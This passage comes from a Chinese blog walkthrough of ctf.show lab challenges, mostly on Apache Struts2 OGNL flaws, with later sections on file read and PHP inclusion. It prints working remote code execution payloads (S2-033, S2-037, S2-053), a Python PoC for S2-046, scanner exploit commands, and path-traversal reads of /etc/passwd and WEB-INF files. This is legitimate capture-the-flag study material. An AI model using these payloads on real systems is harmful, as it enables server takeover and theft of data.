+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-015&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.PageAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/&#123;1&#125;.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>即，访问name.action时利用name.jsp渲染页面。<code>&#123;1&#125;</code>是一个占位符，用于从匹配的Action名中提取部分，插入到结果路径中。</p>
+<p>直接上工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://b466b55f-f638-42e7-8a0b-0d739eb8a609.challenge.ctf.show/S2-015/welcome.action -n S2-015 -e</span><br></pre></td></tr></table></figure>
+
+<h2 id="web287-S2-016"><a href="#web287-S2-016" class="headerlink" title="web287 - S2-016"></a>web287 - S2-016</h2><p>S2-016<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-016/README.zh-cn.md">原理及利用</a></p>
+<blockquote>
+<p>在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</p>
+</blockquote>
+<p>直接上工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://11851f0c-f44a-4163-98bd-c332da7206fb.challenge.ctf.show/S2-016/default.action -n S2-016 -e</span><br></pre></td></tr></table></figure>
+
+<h2 id="web288-S2-019"><a href="#web288-S2-019" class="headerlink" title="web288 - S2-019"></a>web288 - S2-019</h2><p>S2-019<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jinqi520/p/10814738.html">漏洞原理</a></p>
+<p>直接上工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://fa83a557-c478-4e51-866c-3e845f22790d.challenge.ctf.show/S2-019/example/HelloWorld.action -n S2-019 -e</span><br></pre></td></tr></table></figure>
+
+<h2 id="web289-S2-032"><a href="#web289-S2-032" class="headerlink" title="web289 - S2-032"></a>web289 - S2-032</h2><p>S2-032<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-032/README.zh-cn.md">漏洞原理</a></p>
+<p>直接上工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u <span class="string">&quot;http://d3ff6f24-52ce-49de-9adf-b1b7035441c3.challenge.ctf.show/S2-029/default.action?message=aa&quot;</span> -n S2-032 -e</span><br></pre></td></tr></table></figure>
+
+<h2 id="web290-S2-032"><a href="#web290-S2-032" class="headerlink" title="web290 - S2-032?"></a>web290 - S2-032?</h2><p>全都能用工具一把梭</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u <span class="string">&quot;http://ad7d4b9e-98e7-4df0-8ea5-12c0fcaa276c.challenge.ctf.show/S2-032/memocreate.action&quot;</span> -n S2-032 -e</span><br></pre></td></tr></table></figure>
+
+<h2 id="web291-S2-033"><a href="#web291-S2-033" class="headerlink" title="web291 - S2-033"></a>web291 - S2-033</h2><blockquote>
+<p>It is possible to pass a malicious expression which can be used to execute arbitrary code on server side when Dynamic Method Invocation is enabled when using the REST Plugin.</p>
+</blockquote>
+<p>直接用工具没法用S2-033打。但工具能用S2-045，非常的神秘。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://92959e1e-d442-41ea-aec6-4f3c3855f69e.challenge.ctf.show/S2-033/orders -n S2-045 -e</span><br></pre></td></tr></table></figure>
+
+<p>直接看<a target="_blank" rel="noopener" href="https://www.xl-bit.cn/111.html">wp</a>：</p>
+<blockquote>
+<p>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</p>
+</blockquote>
+<p>从<a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/136126951">wp</a>偷了个PoC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /S2-033/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="web292-S2-037"><a href="#web292-S2-037" class="headerlink" title="web292 - S2-037"></a>web292 - S2-037</h2><blockquote>
+<p>It is possible to pass a malicious expression which can be used to execute arbitrary code on server side when using the REST Plugin.</p>
+</blockquote>
+<p>直接用工具没法用S2-037打。但工具能用S2-045，非常的神秘。</p>
+<p>从<a target="_blank" rel="noopener" href="https://blog.csdn.net/uuzeray/article/details/136126951">wp</a>偷了个PoC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b9088892-edbe-45fd-9291-0c9457fd249a.challenge.ctf.show/S2-037/orders/3/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=7556&amp;command=env</span><br></pre></td></tr></table></figure>
+
+<h2 id="web293-S2-045"><a href="#web293-S2-045" class="headerlink" title="web293 - S2-045"></a>web293 - S2-045</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-045/README.zh-cn.md">S2-045原理和PoC</a></p>
+<blockquote>
+<p>It is possible to perform a RCE attack with a malicious Content-Type value. If the Content-Type value isn’t valid an exception is thrown which is then used to display an error message to a user.</p>
+</blockquote>
+<p>居然能把Content-Type都OGNL解析。</p>
+<p>直接上工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://0c6eda4d-873f-422c-a553-a81a6495a431.challenge.ctf.show/S2-045/orders/3 -n S2-045 -e</span><br></pre></td></tr></table></figure>
+
+<h2 id="web294-S2-046"><a href="#web294-S2-046" class="headerlink" title="web294 - S2-046"></a>web294 - S2-046</h2><blockquote>
+<p>It is possible to perform a RCE attack with a malicious Content-Disposition value or with improper Content-Length header. If the Content-Disposition &#x2F; Content-Length value is not valid an exception is thrown which is then used to display an error message to a user. This is a different vector for the same vulnerability described in S2-045 (CVE-2017-5638).</p>
+</blockquote>
+<p>主要影响使用Jakarta Multipart parser处理文件上传时的应用程序。</p>
+<p>S2-045是打Content-Type；S2-046是打Content-Disposition。令人感叹。</p>
+<p>直接上工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://a9adc851-6eea-4e9e-be49-5a8c2e692f63.challenge.ctf.show/S2-046/doUpload.action -n S2-046 -e</span><br></pre></td></tr></table></figure>
+
+<p>尝试偷了一个<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-046/README.zh-cn.md">S2-046的PoC</a>，根据靶机的不同修改了一下，其中ip和port还得用wireshark抓着看。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">q = <span class="string">b&#x27;&#x27;&#x27;------WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foo</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryXd004BVJN9pBYBL2--&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;&#x27;POST /S2-046/doUpload.action HTTP/1.1</span></span><br><span class="line"><span class="string">Host: a9adc851-6eea-4e9e-be49-5a8c2e692f63.challenge.ctf.show</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.8,es;q=0.6</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Length: %d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>) % (<span class="built_in">len</span>(q), )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># your-ip your-port</span></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((<span class="string">&#x27;124.223.158.81&#x27;</span>, <span class="string">&#x27;45810&#x27;</span>), timeout=<span class="number">5</span>) <span class="keyword">as</span> conn:</span><br><span class="line">    conn.send(p + q)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">10240</span>).decode())</span><br></pre></td></tr></table></figure>
+
+<p>但是失败了。尝试抓包看，在TCP握手过程服务器都没有回传。</p>
+<h2 id="web295-S2-048"><a href="#web295-S2-048" class="headerlink" title="web295 - S2-048"></a>web295 - S2-048</h2><p>地点在<code>/integration/saveGangster.action</code>。</p>
+<blockquote>
+<p>It is possible to perform a RCE attack with a malicious field value when using the Struts 2 Struts 1 plugin and it’s a Struts 1 action and the value is a part of a message presented to the user, i.e. when using untrusted input as a part of the error message in the ActionMessage class.</p>
+</blockquote>
+<p>直接上工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\Struts2Scan.py -u http://15e913d3-7569-496f-ae4d-bf41fc2420dd.challenge.ctf.show/S2-048/integration/saveGangster.action -n S2-048 -d <span class="string">&quot;name=&#123;exp&#125;&amp;age=1&amp;__checkbox_bustedBefore=true&amp;description=123&quot;</span> -e</span><br></pre></td></tr></table></figure>
+
+<h2 id="web296-S2-052"><a href="#web296-S2-052" class="headerlink" title="web296 - S2-052"></a>web296 - S2-052</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md">S2-052原理及利用</a></p>
+<p>这个靶机还存在S2-045漏洞，可以用工具直接打。</p>
+<h2 id="web297-S2-053"><a href="#web297-S2-053" class="headerlink" title="web297 - S2-053"></a>web297 - S2-053</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-053/README.zh-cn.md">S2-053原理及利用</a></p>
+<blockquote>
+<p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+</blockquote>
+<p>这题的漏洞点在<code>http://39d66849-081e-46aa-8c52-6973dd49d7a5.challenge.ctf.show/S2-053/?name=</code></p>
+<p>输入payload即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web298-一个Servlet"><a href="#web298-一个Servlet" class="headerlink" title="web298 - 一个Servlet"></a>web298 - 一个Servlet</h2><p>.war文件可以直接用IDEA反编译，或者用Jadx。</p>
+<p>反编译后发现其内容是一个简单的Servlet。首先看<code>loginServlet.java</code>，发现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(username, password);</span><br><span class="line">        <span class="keyword">if</span> (username == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            out.print(<span class="string">&quot;you are not admin&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (user.getVipStatus()) &#123;</span><br><span class="line">            out.print(<span class="string">&quot;you are login&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> Util.readFlag(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">            out.print(flag);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.print(<span class="string">&quot;login failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>研究<code>User</code>类发现是传特定参数就能过。</p>
+<p>那就只需要找到触发这个Servlet的路由即可。打开<code>web.xml</code>查看配置</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>This is the description of my J2EE component<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>This is the display name of my J2EE component<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>login<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.ctfshow.servlet.loginServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>login<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问<code>/login</code>然后传参即可。<code>http://143a14a2-0fc4-4b69-be36-afbe2fc121f9.challenge.ctf.show/ctfshow/login?username=admin&amp;password=ctfshow</code></p>
+<h2 id="web299"><a href="#web299" class="headerlink" title="web299"></a>web299</h2><p>f12看源代码，发现</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /view-source?file=index.php --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>盲猜任意文件读取。尝试<code>?file=../.../../../../../etc/passwd</code>，失败。</p>
+<p>看<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/130026063">wp</a>，是读<code>WEB-INF/web.xml</code>。应该是权限问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://71b14416-8a6a-46e9-bfb2-b6f029f5fc60.challenge.ctf.show/view-source?file=/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+
+<p>出来的结果</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">where is flag?</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span> 	<span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> 	<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> 	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee 	http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span><span class="tag">&lt;/<span class="name">display-name</span>&gt;</span>  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span>    <span class="tag">&lt;<span class="name">description</span>&gt;</span>This is the description of my J2EE component<span class="tag">&lt;/<span class="name">description</span>&gt;</span>    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>This is the display name of my J2EE component<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span>    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ViewSourceServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.ctfshow.servlet.ViewSourceServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span>  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span>  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span>    <span class="tag">&lt;<span class="name">description</span>&gt;</span>This is the description of my J2EE component<span class="tag">&lt;/<span class="name">description</span>&gt;</span>    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>This is the display name of my J2EE component<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span>    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>GetFlag<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.ctfshow.servlet.GetFlag<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span>  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span>  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ViewSourceServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/view-source<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span>  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>GetFlag<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/getFlag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span>	  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span>    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span>  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有一个<code>/getFlag</code>路由。访问&#x2F;view-source?file&#x3D;&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;ctfshow&#x2F;servlet&#x2F;GetFlag.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">where is flag?</span><br><span class="line">????2ecom/ctfshow/servlet/GetFlagjavax/servlet/http/HttpServletserialVersionUIDJConstantValue?????&lt;init&gt;()VCodeLineNumberTableLocalVariableTable<span class="built_in">this</span>Lcom/ctfshow/servlet/GetFlag;destroydoGetR(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)VExceptionsjavax/servlet/ServletExceptionjava/io/IOException	text/html <span class="string">&quot;!&amp;javax/servlet/http/HttpServletResponse#$setContentType(Ljava/lang/String;)V&amp; ()*	getWriter()Ljava/io/PrintWriter;,?&lt;!DOCTYPE HTML PUBLIC &quot;</span>-<span class="comment">//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;.0/java/io/PrintWriter1$println3f576%javax/servlet/http/HttpServletRequest89getCookies()[Ljavax/servlet/http/Cookie;;=&lt;com/ctfshow/utils/CookieUtil&gt;?getCookieValueByNameB(Ljava/lang/String;[Ljavax/servlet/http/Cookie;)Ljava/lang/String;ActfshowCEDjava/lang/StringFGequals(Ljava/lang/Object;)ZI/fl3gKMLcom/ctfshow/utils/FileUtilNOgetFileContent&amp;(Ljava/lang/String;)Ljava/lang/String;Qjust a joke.STflush.VWcloserequest&#x27;Ljavax/servlet/http/HttpServletRequest;response(Ljavax/servlet/http/HttpServletResponse;contentLjava/lang/String;outLjava/io/PrintWriter;flagStackMapTableinitSourceFileGetFlag.java!3*??3*?? &quot;?N,?%N,?&#x27;:+?-2+?4?::@?B?H?JN?PN-?-?R?U?212345&#x27;617:9=;C&lt;H=M&gt;&gt;NNXYNZ[C\];^_&#x27;&#x27;`]a?:C.Cb+?Gcd</span></span><br></pre></td></tr></table></figure>
+<p>得到<code>.class</code>文件。尝试直接复制文件内容然后反编译，失败。有个<code>/fl3g</code>。尝试任意文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view-source?file=../../../../../fl3g</span><br></pre></td></tr></table></figure>
+
+<h2 id="web300-PHP文件包含"><a href="#web300-PHP文件包含" class="headerlink" title="web300 - PHP文件包含"></a>web300 - PHP文件包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>打开居然是这样。尝试文件包含，成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p>尝试任意代码执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=php://input</span><br><span class="line">POST &lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>提示不让用POST，尝试远程文件包含，失败。</p>
+<p>最后看了wp发现flag叫这个名字，这道题应该是半成品。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../f1bg</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
